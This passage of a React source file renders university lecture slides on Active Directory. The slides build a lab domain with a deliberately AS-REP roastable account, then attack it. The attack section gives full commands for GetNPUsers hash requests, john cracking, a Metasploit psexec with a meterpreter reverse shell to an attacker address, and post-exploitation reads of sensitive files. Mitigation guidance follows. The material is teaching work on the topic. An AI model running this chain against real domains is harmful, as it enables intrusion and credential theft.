  -InstallDns \`
  -SafeModeAdministratorPassword \`
    (ConvertTo-SecureString "Admin123" \`
     -AsPlainText -Force) \`
  -Force`}
							/>
						</>
					}
					right={
						<>
							<SH theme={theme}>What happens during promotion</SH>
							<StepList
								theme={theme}
								steps={[
									{
										n: 1,
										title: "NTDS.dit created",
										desc: "The AD database file is initialized at C:\\Windows\\NTDS\\",
									},
									{
										n: 2,
										title: "DNS zone created",
										desc: "lab.local forward lookup zone is created automatically",
									},
									{
										n: 3,
										title: "SYSVOL initialized",
										desc: "Shared folder for GPOs and login scripts",
									},
									{
										n: 4,
										title: "Server reboots",
										desc: "Machine restarts and logs in as LAB\\Administrator",
									},
									{
										n: 5,
										title: "Verify",
										desc: "Run: Get-ADDomain — should return lab.local details",
									},
								]}
							/>
						</>
					}
				/>
			),
		},
		{
			id: 9,
			title: "Populate Active Directory",
			subtitle: "Part 1 — Users, Groups & OUs (including the misconfiguration)",
			tag: "Part 1 · Setup",
			tagColor: "#34d399",
			content: (
				<>
					<SH theme={theme}>Create OUs, Users and Groups via PowerShell</SH>
					<CodeBlock
						theme={theme}
						lang="powershell"
						code={`
$pw = ConvertTo-SecureString "Password123!" -AsPlainText -Force

New-ADUser -Name "Alice Martin"    -SamAccountName "amartin"   -AccountPassword $pw -Enabled $true -Department "IT"       -Title "Systems Administrator" -EmailAddress "amartin@lab.local"
New-ADUser -Name "Bob Johnson"     -SamAccountName "bjohnson"  -AccountPassword $pw -Enabled $true -Department "Finance"  -Title "Accountant"            -EmailAddress "bjohnson@lab.local"
New-ADUser -Name "Carol Williams"  -SamAccountName "cwilliams" -AccountPassword $pw -Enabled $true -Department "HR"       -Title "HR Manager"            -EmailAddress "cwilliams@lab.local"
New-ADUser -Name "David Brown"     -SamAccountName "dbrown"    -AccountPassword $pw -Enabled $true -Department "IT"       -Title "Network Engineer"      -EmailAddress "dbrown@lab.local"
New-ADUser -Name "svc-sql"         -SamAccountName "svc-sql"   -AccountPassword $pw -Enabled $true -Description "SQL Server Service Account"

New-ADGroup -Name "IT-Admins"       -GroupScope Global -Path "DC=lab,DC=local"
New-ADGroup -Name "Finance-Users"   -GroupScope Global -Path "DC=lab,DC=local"
New-ADGroup -Name "HR-Users"        -GroupScope Global -Path "DC=lab,DC=local"
New-ADGroup -Name "DB-Admins"       -GroupScope Global -Path "DC=lab,DC=local"
"
Add-ADGroupMember -Identity "IT-Admins"     -Members amartin, dbrown
Add-ADGroupMember -Identity "Finance-Users" -Members bjohnson
Add-ADGroupMember -Identity "HR-Users"      -Members cwilliams
Add-ADGroupMember -Identity "DB-Admins"     -Members svc-sql
Add-ADGroupMember -Identity "Domain Admins" -Members amartin

New-Item -Path "C:\\Shares\\Finance"  -ItemType Directory -Force
New-Item -Path "C:\\Shares\\HR"       -ItemType Directory -Force
New-Item -Path "C:\\Shares\\IT"       -ItemType Directory -Force
New-Item -Path "C:\\Shares\\Backups"  -ItemType Directory -Force
`}
					/>
					<SH theme={theme} color="#f87171">
						Intentional Misconfiguration — AS-REP Roastable Account
					</SH>
					<CodeBlock
						theme={theme}
						lang="powershell"
						code={`New-ADUser -Name "w10" -SamAccountName "w10" \`
  -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) \`
  -Enabled $true

# THE MISCONFIGURATION: disable Kerberos pre-authentication
Set-ADAccountControl -Identity "w10" -DoesNotRequirePreAuth $true

# Verify
Get-ADUser w10 -Properties DoesNotRequirePreAuth`}
					/>
					<Alert type="danger" theme={theme}>
						This makes the account AS-REP Roastable — an unauthenticated
						attacker can request a Kerberos hash from the DC and crack it
						offline to obtain valid domain credentials.
					</Alert>
				</>
			),
		},
		{
			id: 10,
			title: "AS-REP Roasting",
			subtitle: "Part 2 — Exploiting the Kerberos misconfiguration",
			tag: "Part 2 · Attack",
			tagColor: "#f87171",
			content: (
				<TwoCol
					left={
						<>
							<SH theme={theme}>What is AS-REP Roasting?</SH>
							<p
								style={{ fontSize: "1rem", color: v.bodyText, lineHeight: 1.8 }}
							>
								Kerberos normally requires a client to prove its identity before
								the DC hands out a ticket — this is called{" "}
								<strong style={{ color: v.textStrong }}>
									pre-authentication
								</strong>
								. When disabled, anyone can ask the DC for a Kerberos AS-REP
								response{" "}
								<strong style={{ color: v.textStrong }}>
									without knowing the password
								</strong>
								.
							</p>
							<p
								style={{
									fontSize: "1rem",
									color: v.bodyText,
									lineHeight: 1.8,
									marginTop: "0.85rem",
								}}
							>
								The AS-REP response contains a hash encrypted with the
								account&apos;s password. The attacker cracks it completely
							</p>
							<SH theme={theme}>Why it&apos;s so dangerous</SH>
							<BList
								theme={theme}
								items={[
									"Zero credentials needed to start the attack",
									"The DC hands the hash to anyone who asks",
									"One weak password = full domain access",
								]}
							/>
						</>
					}
					right={
						<>
							<SH theme={theme}>Technical Details</SH>
							{[
								["Protocol", "Kerberos v5 — port 88"],
								["Trigger", "DoesNotRequirePreAuth = True"],
								["Tool", "Impacket GetNPUsers"],
								["Crack tool", "john / hashcat + rockyou.txt"],
							].map(([k, val]) => (
								<TermRow key={k} k={k} v={val} theme={theme} />
							))}
						</>
					}
				/>
			),
		},
		{
			id: 11,
			title: "Attacker Setup",
			subtitle: "Part 2 — Arch Linux, Impacket & Metasploit",
			tag: "Part 2 · Attack",
			tagColor: "#f87171",
			content: (
				<TwoCol
					left={
						<>
							<SH theme={theme}>1. Install Tools on Arch Linux</SH>
							<CodeBlock
								theme={theme}
								lang="bash"
								code={`sudo pacman -S metasploit nmap
sudo pacman -S impacket`}
							/>
						</>
					}
					right={
						<>
							<SH theme={theme}>2. Verify Connectivity</SH>
							<CodeBlock
								theme={theme}
								lang="bash"
								code={`ping 192.168.56.105    # DC
ping 192.168.56.20     # Win10
nmap -p 445 192.168.56.105 192.168.56.20`}
							/>
						</>
					}
				/>
			),
		},
		{
			id: 12,
			title: "Step 1 — Compromise the DC",
			subtitle: "Part 2 — AS-REP Roast → crack hash → PSExec → SYSTEM on DC",
			tag: "Part 2 · Attack",
			tagColor: "#f87171",
			content: (
				<>
					<AttackFlowDiagram theme={theme} />
					<TwoCol
						left={
							<>
								<SH theme={theme}>Phase A — AS-REP Roast</SH>
								<CodeBlock
									theme={theme}
									lang="bash"
									code={`echo "w10" > /tmp/users.txt

GetNPUsers.py lab.local/ \\
  -usersfile /tmp/users.txt \\
  -no-pass \\
  -dc-ip 192.168.56.105 \\
  -outputfile /tmp/hash.txt

# Output:
# $krb5asrep$23$w10@LAB.LOCAL:a3f9...`}
								/>
								<SH theme={theme}>Phase B — Crack the hash offline</SH>
								<CodeBlock
									theme={theme}
									lang="bash"
									code={`john /tmp/hash.txt --wordlist=rockyou.txt
john /tmp/hash.txt --show
# w10 : Password123`}
								/>
							</>
						}
						right={
							<>
								<SH theme={theme}>
									Phase C — PSExec into DC with cracked creds
								</SH>
								<CodeBlock
									theme={theme}
									lang="bash"
									code={`msfconsole

use exploit/windows/smb/psexec
set SMBUser w10
set SMBPass Password123
set SMBDomain lab.local
set RHOSTS 192.168.56.105   
set PAYLOAD windows/x64/meterpreter/reverse_tcp 
set LHOST 192.168.56.1
set LPORT 4444
run

# ✓ Meterpreter session 1 on DC
meterpreter > getuid
# NT AUTHORITY\\SYSTEM`}
								/>
								<Alert type="danger" theme={theme}>
									SYSTEM-level access on the Domain Controller. Every account
									and machine in lab.local is now compromised.
								</Alert>
							</>
						}
					/>
				</>
			),
		},
		{
			id: 13,
			title: "Post-Exploitation",
			subtitle: "Part 2 — What an attacker can do with SYSTEM on the DC",
			tag: "Part 2 · Attack",
			tagColor: "#f87171",
			content: (
				<>
					<>
						<CodeBlock
							theme={theme}
							lang="bash"
							code={`meterpreter > shell
										
# AD Users with details 
	net user /domain
# All groups 
	net group /domain
# Domain Admins 
	net group "Domain Admins" /domain
# All shared folders
	net share
# Read the sensitive files
	type "C:\\Shares\\IT\\service_accounts.txt"
	type "C:\\Shares\\HR\\employee_records.csv"
	type "C:\\Shares\\Finance\\salaries_confidential.csv"
	type "C:\\Shares\\IT\\network_inventory.txt"
	type "C:\\Databases\\users_dump.sql"
									`}
						/>
					</>
				</>
			),
		},
		{
			id: 14,
			title: "Defence & Mitigation",
			subtitle: "How to protect against AS-REP Roasting & lateral movement",
			tag: "Blue Team",
			tagColor: "#a78bfa",
			content: (
				<div
					style={{
						display: "grid",
						gridTemplateColumns: "repeat(auto-fit, minmax(230px, 1fr))",
						gap: "1.1rem",
					}}
				>
					{[
						{
							icon: "🔒",
							title: "Fix the Misconfiguration",
							color: "#a78bfa",
							items: [
								"Never disable Kerberos pre-authentication",
								"Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}",
								"Review all service accounts quarterly",
								"Apply least-privilege to every service account",
							],
						},
						{
							icon: "🔑",
							title: "Strong Password Policy",
							color: "#38bdf8",
							items: [
								"Service accounts need 25+ char random passwords",
								"Long passwords make offline cracking infeasible",
								"Use Group Managed Service Accounts (gMSA)",
								"Rotate service account passwords automatically",
							],
						},
						{
							icon: "🛡",
							title: "Network Segmentation",
							color: "#34d399",
							items: [
								"Block SMB (445) between workstations",
								"Isolate DCs in a dedicated VLAN",
								"Use Windows Firewall rules per segment",
								"Prevent lateral movement with Zero Trust",
							],
						},
						{
							icon: "👁",
							title: "Detection & Monitoring",
							color: "#f59e0b",
							items: [
								"Monitor Event ID 4768 — AS-REP requests",
								"Monitor Event ID 7045 — new service installed",
								"Alert on anomalous Kerberos requests",
								"Deploy a SIEM (Splunk, ELK, Wazuh)",
							],
						},
					].map((card) => (
						<div
							key={card.title}
							style={{
								border: `1px solid ${card.color}50`,
								padding: "1.15rem",
								borderRadius: 7,
								background: v.cardBg,
							}}
						>
							<div style={{ fontSize: "1.65rem", marginBottom: "0.6rem" }}>
								{card.icon}
							</div>
							<div
								style={{
									fontSize: "0.97rem",
									fontWeight: 700,
									marginBottom: "0.9rem",
									color: card.color,
								}}
							>
								{card.title}
							</div>
							<BList theme={theme} items={card.items} />
						</div>
					))}
				</div>
			),
		},
		{
			id: 15,
			title: "Summary",
			subtitle: "Key takeaways",
			tag: "Conclusion",
			tagColor: "#f59e0b",
			content: (
				<div
					style={{ display: "flex", flexDirection: "column", gap: "1.85rem" }}
				>
					<div className="summary-cols three">
						{[
							{
								title: "📚 Theory",
								color: "#38bdf8",
								items: [
									"AD DS — central directory for identity",
									"Forest → Domain → OU hierarchy",
									"LDAP, Kerberos, DNS, NTLM protocols",
									"Domains in ~90% of enterprises",
								],
							},
							{
								title: "🖥 We Built",
								color: "#34d399",
								items: [
									"Windows Server 2025 DC (Server Core)",
									"AD DS with lab.local forest",
									"Users, Groups & OUs",
									"AS-REP roastable w10 account",
									"Win10 joined to the domain",
								],
							},
							{
								title: "⚡ We Attacked",
								color: "#f87171",
								items: [
									"AS-REP Roasted w10 — no creds needed",
									"Cracked Kerberos hash → Password123",
									"PSExec into DC → SYSTEM (session 1)",
									"Set pivot route through DC",
									"PSExec into Win10 via DC → SYSTEM (session 2)",
									"Dumped credentials with Kiwi/Mimikatz",
								],
							},
						].map((col) => (
							<div
								key={col.title}
								style={{
									background: v.cardBg,
									border: `1px solid ${v.border}`,
									padding: "1.4rem",
									borderRadius: 7,
								}}
							>
								<div
									style={{
										fontSize: "0.97rem",
										fontWeight: 700,
										marginBottom: "0.95rem",
										color: col.color,
									}}
								>
									{col.title}
								</div>
								<BList theme={theme} items={col.items} />
							</div>
						))}
					</div>
				</div>
			),
		},
	];
}

// ─── PROGRESS BAR ─────────────────────────────────────────────────────────────
function ProgressBar({
	current,
	total,
	accent,
}: {
	current: number;
	total: number;
	accent: string;
}) {
	return (
		<div
			style={{
				height: 2,
				background: "transparent",
				width: "100%",
				position: "relative",
				zIndex: 1,
			}}
		>
			<div
				style={{
					height: "100%",
					background: accent,
					width: `${((current + 1) / total) * 100}%`,
					transition: "width 0.4s ease",
				}}
			/>
		</div>
	);
}

// ─── LANDING ──────────────────────────────────────────────────────────────────
function Landing({
	onStart,
	theme,
	setTheme,
}: {
	onStart: () => void;
	theme: Theme;
	setTheme: (t: Theme) => void;
}) {
	const [typed, setTyped] = useState("");
	const target = "Active Directory Domain Services";
	const v = getVars(theme);
	useEffect(() => {
		let i = 0;
		const iv = setInterval(() => {
			if (i <= target.length) {
				setTyped(target.slice(0, i));
				i++;
			} else clearInterval(iv);
		}, 60);
		return () => clearInterval(iv);
	}, []);
	return (
		<div
			style={{
				minHeight: "100vh",
				display: "flex",
				alignItems: "center",
				justifyContent: "center",
				padding: "3rem 1.5rem",
				background: v.bgGrad,
				position: "relative",
			}}
		>
			{/* Scanlines only in dark */}
			{theme === "dark" && (
				<div
					style={{
						position: "fixed",
						inset: 0,
						pointerEvents: "none",
						zIndex: 0,
						background:
							"repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,100,0.012) 2px, rgba(0,255,100,0.012) 4px)",
					}}
				/>
			)}
			<div
				style={{
					position: "relative",
					zIndex: 1,
					maxWidth: 940,
					width: "100%",
					display: "flex",
					flexDirection: "column",
					alignItems: "center",
					gap: "2.25rem",
					textAlign: "center",
				}}
			>
				{/* Top bar with toggle */}
				<div
					style={{ width: "100%", display: "flex", justifyContent: "flex-end" }}
				>
					<ThemeToggle theme={theme} setTheme={setTheme} />
				</div>

				<div
					style={{
						display: "flex",
						alignItems: "center",
						gap: 10,
						fontSize: "0.78rem",
						letterSpacing: "0.18em",
						color: v.accent,
						fontFamily: "'JetBrains Mono', monospace",
						border: `1px solid ${v.accent}40`,
						padding: "7px 20px",
						borderRadius: 3,
					}}
				>
					<div
						style={{
							width: 7,
							height: 7,
							background: v.accent,
							borderRadius: "50%",
							animation: "pulse 1.5s ease-in-out infinite",
							flexShrink: 0,
						}}
					/>
					Network Administration · University of Laghouat
				</div>

				<h1
					style={{
						fontSize: "clamp(2.4rem, 6vw, 4.2rem)",
						fontWeight: 700,
						color: v.textStrong,
						letterSpacing: "-0.03em",
						lineHeight: 1.1,
						fontFamily: "'Inter', sans-serif",
					}}
				>
					{typed}
					<span
						style={{
							display: "inline-block",
							color: v.accent,
							animation: "blink 0.9s step-end infinite",
						}}
					>
						█
					</span>
				</h1>

				<p
					style={{
						color: v.textMuted,
						fontSize: "1.2rem",
						letterSpacing: "0.01em",
						fontWeight: 400,
					}}
				>
					Protocols, Concepts &amp; Practical Implementation
				</p>

				<div
					style={{
						display: "flex",
						alignItems: "center",
						gap: "1.5rem",
						flexWrap: "wrap",
						justifyContent: "center",
					}}
				>
					{[
						["📋", "17 Slides"],
						["⏱", "~30 min"],
						["🧪", "Live Lab Demo"],
						["🛡", "Isolated Environment"],
					].map(([icon, label], i) => (
						<span
							key={i}
							style={{
								fontSize: "0.95rem",
								color: theme === "dark" ? "#94a3b8" : "#64748b",
								display: "flex",
								alignItems: "center",
								gap: 7,
							}}
						>
							<span style={{ fontSize: "1.1rem" }}>{icon}</span>
							{label}
						</span>
					))}
				</div>

				<div
					style={{
						display: "grid",
						gridTemplateColumns: "repeat(auto-fit, minmax(250px, 1fr))",
						gap: "1.1rem",
						width: "100%",
					}}
				>
					{[
						{
							color: "#38bdf8",
							icon: "📚",
							title: "Part 0 — Theory",
							body: "Understand what AD DS is, how the Forest/Domain/OU hierarchy works, and the protocols (LDAP, Kerberos, DNS) that power it.",
						},
						{
							color: "#34d399",
							icon: "🖥",
							title: "Part 1 — Build",
							body: "Set up a Windows Server 2025 Domain Controller, create users, groups, OUs, and an intentionally misconfigured service account.",
						},
						{
							color: "#f87171",
							icon: "⚡",
							title: "Part 2 — Attack",
							body: "AS-REP Roast the DC, crack the hash, PSExec in, pivot through the DC, and land SYSTEM on Win10 — all from Arch Linux.",
						},
					].map((card) => (
						<div
							key={card.title}
							style={{
								background: v.cardBg,
								border: `1px solid ${card.color}60`,
								borderRadius: 8,
								padding: "1.6rem",
								textAlign: "left",
								transition: "transform 0.2s, box-shadow 0.2s",
								cursor: "default",
							}}
							onMouseEnter={(e) => {
								(e.currentTarget as HTMLDivElement).style.transform =
									"translateY(-3px)";
								(e.currentTarget as HTMLDivElement).style.boxShadow =
									"0 8px 30px rgba(0,0,0,0.15)";
							}}
							onMouseLeave={(e) => {
								(e.currentTarget as HTMLDivElement).style.transform = "";
								(e.currentTarget as HTMLDivElement).style.boxShadow = "";
							}}
						>
							<div style={{ fontSize: "1.8rem", marginBottom: "0.65rem" }}>
								{card.icon}
							</div>
							<div
								style={{
									fontSize: "1.05rem",
									fontWeight: 700,
									marginBottom: "0.6rem",
									color: card.color,
								}}
							>
								{card.title}
							</div>
							<p
								style={{
									fontSize: "0.92rem",
									color: v.textMuted,
									lineHeight: 1.7,
								}}
							>
								{card.body}
							</p>
						</div>
					))}
				</div>

				<button
					onClick={onStart}
					style={{
						display: "flex",
						alignItems: "center",
						gap: 14,
						background: v.accent,
						color: theme === "dark" ? "#050a0e" : "#ffffff",
						border: "none",
						padding: "1.1rem 2.8rem",
						fontFamily: "'Inter', sans-serif",
						fontSize: "1.1rem",
						fontWeight: 700,
						cursor: "pointer",
						borderRadius: 6,
						transition: "all 0.2s",
						boxShadow: `0 4px 24px ${v.accent}40`,
					}}
					onMouseEnter={(e) => {
						(e.currentTarget as HTMLButtonElement).style.transform =
							"scale(1.04)";
					}}
					onMouseLeave={(e) => {
						(e.currentTarget as HTMLButtonElement).style.transform = "";
					}}
				>
					<span>Start Presentation</span>
					<span style={{ fontSize: "1.35rem" }}>→</span>
				</button>

				<p
					style={{
						fontSize: "0.85rem",
						color: theme === "dark" ? "#334155" : "#94a3b8",
					}}
				>
					Use{" "}
					<kbd
						style={{
							background: v.cardBg2,
							border: `1px solid ${v.borderMid}`,
							padding: "2px 8px",
							borderRadius: 3,
							fontFamily: "'JetBrains Mono', monospace",
							fontSize: "0.8rem",
							color: v.text,
						}}
					>
						←
					</kbd>{" "}
					<kbd
						style={{
							background: v.cardBg2,
							border: `1px solid ${v.borderMid}`,
							padding: "2px 8px",
							borderRadius: 3,
							fontFamily: "'JetBrains Mono', monospace",
							fontSize: "0.8rem",
							color: v.text,
						}}
					>
						→
					</kbd>{" "}
					arrow keys or on-screen buttons to navigate
				</p>
			</div>
		</div>
	);
}

// ─── PRESENTATION ─────────────────────────────────────────────────────────────
function Presentation({
	onExit,
	theme,
	setTheme,
}: {
	onExit: () => void;
	theme: Theme;
	setTheme: (t: Theme) => void;
}) {
	const [current, setCurrent] = useState(0);
	const slides = makeSlides(theme);
	const total = slides.length;
	const prev = useCallback(() => setCurrent((c) => Math.max(0, c - 1)), []);
	const next = useCallback(
		() => setCurrent((c) => Math.min(total - 1, c + 1)),
		[total],
	);
	const v = getVars(theme);

	useEffect(() => {
		const h = (e: KeyboardEvent) => {
			if (e.key === "ArrowRight" || e.key === "ArrowDown") next();
			if (e.key === "ArrowLeft" || e.key === "ArrowUp") prev();
			if (e.key === "Escape") onExit();
		};
		window.addEventListener("keydown", h);
		return () => window.removeEventListener("keydown", h);
	}, [prev, next, onExit]);

	const slide = slides[current];

	return (
		<div
			style={{
				minHeight: "100vh",
				display: "flex",
				flexDirection: "column",
				background: v.presGrad,
				position: "relative",
			}}
		>
			{theme === "dark" && (
				<div
					style={{
						position: "fixed",
						inset: 0,
						pointerEvents: "none",
						zIndex: 0,
						background:
							"repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,100,0.012) 2px, rgba(0,255,100,0.012) 4px)",
					}}
				/>
			)}

			{/* Top bar */}
			<div
				style={{
					display: "flex",
					alignItems: "center",
					justifyContent: "space-between",
					padding: "0.9rem 2.5rem",
					borderBottom: `1px solid ${v.border}`,
					position: "relative",
					zIndex: 1,
					background: v.bg + "cc",
				}}
			>
				<button
					onClick={onExit}
					style={{
						background: "none",
						border: `1px solid ${v.borderMid}`,
						color: v.textMuted,
						fontFamily: "'JetBrains Mono', monospace",
						fontSize: "0.84rem",
						padding: "5px 14px",
						cursor: "pointer",
						borderRadius: 3,
						transition: "all 0.2s",
					}}
					onMouseEnter={(e) => {
						(e.currentTarget as HTMLButtonElement).style.borderColor = v.accent;
						(e.currentTarget as HTMLButtonElement).style.color = v.accent;
					}}
					onMouseLeave={(e) => {
						(e.currentTarget as HTMLButtonElement).style.borderColor =
							v.borderMid;
						(e.currentTarget as HTMLButtonElement).style.color = v.textMuted;
					}}
				>
					← Back
				</button>
				<div
					style={{
						fontSize: "0.9rem",
						color: v.textMuted,
						letterSpacing: "0.12em",
						fontFamily: "'JetBrains Mono', monospace",
					}}
				>
					{String(current + 1).padStart(2, "0")} /{" "}
					{String(total).padStart(2, "0")}
				</div>
				<div style={{ display: "flex", alignItems: "center", gap: 12 }}>
					<Pill label={slide.tag} color={slide.tagColor} />
					<ThemeToggle theme={theme} setTheme={setTheme} />
				</div>
			</div>

			<ProgressBar current={current} total={total} accent={v.accent} />

			{/* Slide */}
			<div
				key={current}
				style={{
					flex: 1,
					overflowY: "auto",
					padding: "2.75rem 2rem",
					position: "relative",
					zIndex: 1,
					display: "flex",
					justifyContent: "center",
					animation: "slideIn 0.25s ease",
				}}
			>
				<div style={{ width: "100%", maxWidth: 980 }}>
					<div
						style={{
							marginBottom: "1.9rem",
							borderBottom: `1px solid ${v.border}`,
							paddingBottom: "1.15rem",
						}}
					>
						<h2
							style={{
								fontSize: "clamp(1.9rem, 3.5vw, 2.6rem)",
								fontWeight: 700,
								color: v.textStrong,
								fontFamily: "'Inter', sans-serif",
								letterSpacing: "-0.025em",
							}}
						>
							{slide.title}
						</h2>
						{slide.subtitle && (
							<p
								style={{
									fontSize: "1.05rem",
									color: v.textDim,
									marginTop: "0.4rem",
									fontWeight: 400,
								}}
							>
								{slide.subtitle}
							</p>
						)}
					</div>
					<div style={{ width: "100%" }}>{slide.content}</div>
				</div>
			</div>

			{/* Nav */}
			<div
				style={{
					display: "flex",
					alignItems: "center",
					justifyContent: "space-between",
					padding: "0.9rem 2.5rem",
					borderTop: `1px solid ${v.border}`,
					position: "relative",
					zIndex: 1,
					background: v.bg + "cc",
				}}
			>
				<button
					onClick={prev}
					disabled={current === 0}
					style={{
						background: "none",
						border: `1px solid ${v.borderMid}`,
						color: v.bodyText,
						fontFamily: "'JetBrains Mono', monospace",
						fontSize: "0.84rem",
						padding: "7px 20px",
						cursor: current === 0 ? "default" : "pointer",
						borderRadius: 3,
						opacity: current === 0 ? 0.2 : 1,
						transition: "all 0.2s",
					}}
				>
					← Prev
				</button>
				<div
					style={{
						display: "flex",
						gap: 7,
						flexWrap: "wrap",
						justifyContent: "center",
					}}
				>
					{slides.map((_, i) => (
						<button
							key={i}
							onClick={() => setCurrent(i)}
							style={{
								width: 8,
								height: 8,
								borderRadius: "50%",
								background: i === current ? v.accent : v.borderMid,
								border: "none",
								cursor: "pointer",
								transition: "all 0.2s",
							}}
						/>
					))}
				</div>
				<button
					onClick={next}
					disabled={current === total - 1}
					style={{
						background: "none",
						border: `1px solid ${v.borderMid}`,
						color: v.bodyText,
						fontFamily: "'JetBrains Mono', monospace",
						fontSize: "0.84rem",
						padding: "7px 20px",
						cursor: current === total - 1 ? "default" : "pointer",
						borderRadius: 3,
						opacity: current === total - 1 ? 0.2 : 1,
						transition: "all 0.2s",
					}}
				>
					Next →
				</button>
			</div>
		</div>
	);
}

// ─── ROOT ─────────────────────────────────────────────────────────────────────
export default function Home() {
	const [started, setStarted] = useState(false);
	const [theme, setTheme] = useState<Theme>("dark");

	return (
		<>
			<style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap');
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Inter', system-ui, sans-serif; font-size: 16px; line-height: 1.6; min-height: 100vh; overflow-x: hidden; }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
        @keyframes slideIn { from{opacity:0;transform:translateY(10px);} to{opacity:1;transform:none;} }
        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 2.5rem; }
        @media (max-width: 720px) { .two-col { grid-template-columns: 1fr; } }
        .agenda-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; }
        @media (max-width: 620px) { .agenda-grid { grid-template-columns: 1fr; } }
        .summary-cols { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
        .summary-cols.three { grid-template-columns: 1fr 1fr 1fr; }
        @media (max-width: 720px) { .summary-cols, .summary-cols.three { grid-template-columns: 1fr; } }
      `}</style>
			{started ? (
				<Presentation
					onExit={() => setStarted(false)}
					theme={theme}
					setTheme={setTheme}
				/>
			) : (
				<Landing
					onStart={() => setStarted(true)}
					theme={theme}
					setTheme={setTheme}
				/>
			)}
		</>
	);
}
